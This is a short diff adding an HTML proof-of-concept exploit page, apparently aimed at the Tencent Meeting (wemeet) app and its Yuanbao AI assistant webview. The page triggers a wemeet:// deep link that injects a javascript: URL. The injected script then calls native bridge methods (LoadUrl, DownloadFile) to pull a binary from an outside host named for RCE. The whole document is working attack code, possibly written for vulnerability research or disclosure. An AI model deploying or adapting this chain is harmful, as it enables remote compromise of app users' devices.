@@ -1,0 +1,19 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P37</h1>
+<script>
+document.title='P37L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var file='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+/* AskYuanbao standard launchMode, extras.url -> j0 -> loadUrl. First iframe only (Yuanbao destroys ExternalLink). Delay JSAPI past 10009. */
+var jsAsk="javascript:(function(){document.title='P37ASK:'+location.host+'|'+location.protocol;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P37CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,48)};function c(m,e,p,id){if(!window.JSCallJavaMgr){document.title='P37NOJSB:'+location.host;return}window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:id||(m+'.'+e)}))}setTimeout(function(){document.title='P37T-LU';c('CommonPlugin','LoadUrl',{url:'"+official+"'},'p37lu')},8000);setTimeout(function(){document.title='P37T-DL';c('CommonPlugin','DownloadFile',{url:'"+file+"',fileName:'p37.bin'},'p37dl')},16000)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var ask='wemeet://page/yuanbao_ai_assistant/profile_ask_yuanbao?url='+encodeURIComponent(jsAsk);
+setTimeout(function(){ frame(ask,'P37L-ASK'); }, 600);
+</script>
+</body></html>
